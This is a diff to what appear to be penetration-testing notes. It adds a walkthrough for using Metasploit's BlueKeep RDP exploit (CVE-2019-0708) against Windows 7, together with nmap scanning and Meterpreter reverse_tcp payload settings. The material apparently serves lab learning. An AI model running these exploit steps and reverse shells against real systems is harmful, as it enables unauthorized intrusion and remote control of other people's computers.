@@ -292,3 +292,10 @@ for settings payload for different archs. use as follows:
 > set payload windows/x64/meterpreter/reverse_tcp (for 64 bit)
 > set payload windows/meterpreter/reverse_tcp (for 32 bit)
 after setting all options and target specific payloads we then exploit the target using the 'run' cmd
+
+[VIDEO (Windows RDP BlueKeep Exploit)] WINDOWS 7 SP1 x64
+NOTE: this exploit works only if port 3389(this port is usually used by RDP) is opened(to check do 'nmap -sS <target_ip>'), if not press start and enter 'allow remote access to computer', and within that window in Remote Desktop section press 'Allow connections....'. This is usually turned off for home PCs but as of in an enterprise/company this would normally be opened, so we're not faking anything in here
+using msfc we can search for "search bluekeep" start exploiting and also check whether it is vulnerable to the exploit an auxiliary module is available and executed as follows:
+> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce (here make sure the target is set to the right version of windows using "set target <target_id>" and to display different targets use "show targets" as it includes even whether the Win7 OS runs in BareMetal/VirtualBox/Hyper-V etc)
+also settings other options and the right payload start exploiting using the cmd 'exploit'
